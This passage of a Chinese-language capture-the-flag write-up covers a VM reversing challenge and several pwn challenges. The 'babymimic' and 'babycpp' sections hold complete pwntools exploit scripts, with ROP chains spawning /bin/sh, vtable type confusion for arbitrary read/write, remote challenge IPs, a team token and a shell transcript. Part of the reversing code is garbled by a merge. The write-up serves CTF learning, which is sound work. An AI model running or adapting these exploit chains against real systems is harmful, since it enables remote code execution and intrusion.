        9: "fail", #
        0xa: "movm",
        0xb: "push", #
        0xd: "mul", #
        0xe: "div", # 
        0xf: "lsh", #
        0x10: "rsh", # 
        0xff: "end"
    }
    code = [8, 0, 0, 0, 32, 0, 8, 0, 1, 0, 0, 0, 8, 0, 2, 0, 1, 0, 3, 0, 1, 0, 0, 0, 4, 1, 22, 0, 0, 0, 8, 0, 11, 0, 0, 0, 8, 0, 12, 0, 0, 0, 1, 0, 12, 0, 11, 0, 3, 0, 11, 0, 1, 0, 1, 0, 11, 0, 2, 0, 4, 2, 252, 255, 0, 0, 8, 0, 3, 0, 8, 0, 8, 0, 4, 0, 6, 0, 8, 0, 9, 0, 16, 0, 15, 0, 9, 0, 3, 0, 8, 0, 10, 0, 36, 0, 1, 0, 9, 0, 10, 0, 1, 0, 9, 0, 12, 0, 10, 0, 5, 0, 1, 0, 13, 0, 5, 0, 9, 0, 5, 0, 6, 0, 5, 0, 16, 0, 6, 0, 4, 0, 11, 0, 7, 0, 1, 0, 3, 0, 6, 0, 7, 0, 1, 0, 1, 0, 2, 0, 4, 1, 233, 255, 0, 0, 4, 2, 1, 0, 0, 0, 255, 0, 0, 0, 0, 0, 9, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0]
    s = set()
    for i in range(0, len(code), 6):
        opcode = code[i+0]
        check_status = code[i+1]
        op1 = code[i+2] | (code[i+3] > 6 == dst[i]:
                password.append(c)
                break
    password = bytes(password)
    print("Username: {}".format(username.decode('ascii')))
    print("Password: {}".format(password.decode('ascii')))
## Pwn
### babymimic
给了两个x86和x64的程序，又看到了拟态防御，猜会把输入喂给两个程序，测试了一下发现输出不同时会被检测出来，先尝试在没有多余输出的情况下直接反弹其中一个程序的shell，发现也能被检测出。最后看到两个程序栈溢出长度不同，明白了要用一个payload同时打两个程序
    from pwn import *
    import hashlib
    def proof_of_work():
        p.recvuntil(".hexdigest()=")
        h = p.recv(64)
        print h
        p.recvuntil(".encode('hex')=")
        s = p.recv(10).decode("hex")
        p.recvuntil("skr.encode('hex')=")
        print s
        for c1 in range(0xff,-1,-1):
            for c2 in range(0xff,-1,-1):
                for c3 in range(0xff,-1,-1):
                    if hashlib.sha256(s+chr(c1)+chr(c2)+chr(c3)).hexdigest() == h:
                        return s+chr(c1)+chr(c2)+chr(c3)
    '''
    0x0809ccf4: mov dword ptr [eax], edx; ret;
    '''
    int80 = 0x0806f300
    pop_eax = 0x080a8af6
    pop_ebx = 0x080481c9
    pop_ecx_pop_ebx = 0x0806e9f2
    pop_edx = 0x0806e9cb
    add_esp = 0x0806b225 #add esp, 0x100; sub eax, edx; ret;
    pop_rax = 0x000000000043b97c
    pop_rdx = 0x000000000043d9d5
    pop_rdi = 0x00000000004005f6
    pop_rsi = 0x0000000000405895
    syscall = 0x0000000000461645
    #0x0000000000477521: mov qword ptr [rax], rdx; ret;
    payload = "a"*0x10 + "\x00"*0x100 + p32(add_esp) + p32(0)
    x86_payload = ""
    x64_payload = ""
    #reverse_shell = ["/bin/cat","./flag_2d5088d4cac1e7d5f935659807a44db8"]
    reverse_shell = ["/bin/sh"]
    x86_addrs = [0x080DAE00, 0x080DAE00+0x10]
    x86_addr = 0x080DAE00+0x60
    x64_addrs = [0x6A3500, 0x6A3500+0x10]
    x64_addr = 0x6A3500+0x60
    for j in range(0,len(reverse_shell)):
        for i in range(0,len(reverse_shell[j])/4+1):
            x86_payload += p32(pop_eax) + p32(x86_addrs[j]+i*4) + p32(pop_edx) + reverse_shell[j][i*4:i*4+4].ljust(4,"\x00") + p32(0x0809ccf4)
    x86_payload += p32(pop_eax) + p32(11) + p32(pop_ecx_pop_ebx) + p32(0) + p32(x86_addrs[0]) + p32(pop_edx) + p32(0) + p32(int80) + p32(0x08048930)
    for j in range(0, len(reverse_shell)):
        for i in range(0, len(reverse_shell[j])/4+1):
            x64_payload += p64(pop_rax) + p64(x64_addrs[j]+i*8) + p64(pop_rdx) + reverse_shell[j][i*8:i*8+8].ljust(8,"\x00") + p64(0x0000000000477521)
    x64_payload += p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(x64_addrs[0]) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)
    print len(x64_payload),len(x86_payload)
    x64_payload = x64_payload.ljust(0xfc,"\x90")
    payload += x64_payload + p32(0x0804892F) + x86_payload
    flag_file = "flag_2d5088d4cac1e7d5f935659807a44db8"
    p = remote("49.4.51.149",25391)
    #p = process("./_stkof")
    skr = proof_of_work()
    print skr.encode("hex")
    p.sendline(skr.encode("hex"))
    print p.recvuntil("teamtoken:")
    p.sendline("08c5028f14a51d3336c3e4f80414706d")
    p.send(payload)
    p.interactive()
    045b500501510d5703550357525d5102060106565650525c5305010101550750
    flag{4c301c512abbc9b157ee3d4dc1056e14}
### babycpp
update_hash
的abs有问题，输入0x80000000后为-8，可以覆盖vtable指针，把string的vtable改成int的vtable，通过来回改string
array的vtable以类似类型混淆的方式实现任意地址读写,最后rop执行execve("/bin/sh",NULL,NULL)拿shell。刚好两个vtable的第三个16进制不相同，想覆盖需要猜第4个16进制。
    from pwn import *
    def new_array(kind):
        p.recvuntil("Your choice:")
        p.sendline("0")
        p.recvuntil("What kind of array do you want:\n1.Int Array\n2.String Array\nYour choice:")
        p.sendline(str(kind))
    def update(h, idx, new_hash):
        p.recvuntil("Your choice:")
        p.sendline("3")
        p.recvuntil("Input array hash:")
        p.send(h + "\x00")
        p.recvuntil("Input idx:")
        p.sendline(str(idx))
        p.recvuntil("Input hash:")
        p.send(new_hash)
    def set_string_element(h, idx, length, content):
        p.recvuntil("Your choice:")
        p.sendline("2")
        p.recvuntil("Input array hash:")
        p.send(h + "\x00")
        p.recvuntil("Input idx:")
        p.sendline(str(idx))
        p.recvuntil("Input the len of the obj:")
        p.sendline(str(length))
        p.recvuntil("Input your content:")
        p.send(content)
    def set_int_element(h, idx, num):
        p.recvuntil("Your choice:")
        p.sendline("2")
        p.recvuntil("Input array hash:")
        p.send(h + "\x00")
        p.recvuntil("Input idx:")
        p.sendline(str(idx))
        p.recvuntil("Input val:")
        p.sendline(num)
    def show_int(h, idx):
        p.recvuntil("Your choice:")
        p.sendline("1")
        p.recvuntil("Input array hash:")
        p.send(h + "\x00")
        p.recvuntil("Input idx:")
        p.sendline(str(idx))
        p.recvuntil("The value in the array is ")
        addr = p.recvuntil("\n")
        print addr[0:len(addr)-1]
        return int(addr,16)
    def show_str(h, idx):
        p.recvuntil("Your choice:")
        p.sendline("1")
        p.recvuntil("Input array hash:")
        p.send(h + "\x00")
        p.recvuntil("Input idx:")
        p.sendline(str(idx))
        p.recvuntil("Content:")
        addr = p.recv(6).ljust(8,"\x00")
        return u64(addr)
    def update_str_element(h, idx, content):
        p.recvuntil("Your choice:")
        p.sendline("2")
        p.recvuntil("Input array hash:")
        p.send(h + "\x00")
        p.recvuntil("Input idx:")
        p.sendline(str(idx))
        p.recvuntil("Input your content:")
        p.send(content)
    #aslr off
    offset = 0x555555768ff0 - 0x555555768e70
    offset2 = 0x555555768ff0 - 0x555555768ea0
    main_stack =    0x7FFFFFFFDE78
    environ_stack = 0x7fffffffdf68
    offset3 = environ_stack - main_stack
    while True:
        try:        
            #p = process("./babycpp")
            p = remote("49.4.15.125", 32207)
            new_array(1)
            new_array(2)
            set_string_element("\x01", 0, 0x20, "1"*0x20)
            update("\x01", 2147483648, "\xe0\x5c")
            heap_addr = show_int("\x01", 0)
            print hex(heap_addr)
            set_int_element("\x01", 1, hex(heap_addr - offset))
            update("\x01", 2147483648, "\x00\x5d")
            func_addr = show_str("\x01", 1)
            elf_base = func_addr - 0x10C6
            print hex(func_addr)
            print "elf_base: " + hex(elf_base)
            malloc_got = elf_base + 0x201FB8
            print "malloc_got: " + hex(malloc_got)
            update("\x01", 2147483648, "\xe0\x5c")
            set_int_element("\x00", 0, hex(malloc_got))
            set_int_element("\x01", 2, hex(heap_addr - offset2))
            update("\x01", 2147483648, "\x00\x5d")
            libc_malloc = show_str("\x01", 2)
            libc_base = libc_malloc - 0x097070
            print "libc_base: " + hex(libc_base)
            sh = libc_base + 0x1B3E9A
            system = libc_base + 0x4F440
            environ = libc_base + 0x3EE098
            pop_rdi = libc_base + 0x00002155f
            pop_rsi = libc_base + 0x0000023e6a
            pop_rdx = libc_base + 0x0000000000001b96
            execve = libc_base + 0xE4E30
            print "/bin/sh: " + hex(sh)
            print "system: " + hex(system)
            print "execve: " + hex(execve)
            print "environ: " + hex(environ)
            update("\x01", 2147483648, "\xe0\x5c")
            set_int_element("\x00", 0, hex(environ))
            set_int_element("\x01", 2, hex(heap_addr - offset2))
            update("\x01", 2147483648, "\x00\x5d")
            stack = show_str("\x01", 2)
            print "stack: " + hex(stack)
            set_int_element("\x00", 0, hex(stack - offset3))
            set_int_element("\x00", 1, hex(0x100))
            update_str_element("\x01", 2, p64(pop_rdi) + p64(sh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(execve))
            break
        except:
            p.close()
    #gdb.attach(p)
    #raw_input()
    p.interactive()
    Your choice:$ 4
    Bye!
    $ ls
    babycpp
    bin
    dev
    flag
    lib
    lib32
    lib64
    $ cat flag
    flag{9a3a902d2b3e980e0d7b41d756faec03}
    $ 
    [*] Interrupted
    [*] Closed connection to 49.4.15.125 port 32207
### Random
1.利用add_note里在tomorrow增加add_note的功能在game list上留下一个没被删除的节点，但节点本身被释放进了fastbin  
2.把这个fastbin在第二天分配给其他节点，这样game list上有两个相同节点，执行完之后出现double
free，第一次free时保证fastbin为空，否则game list的遍历会出问题。  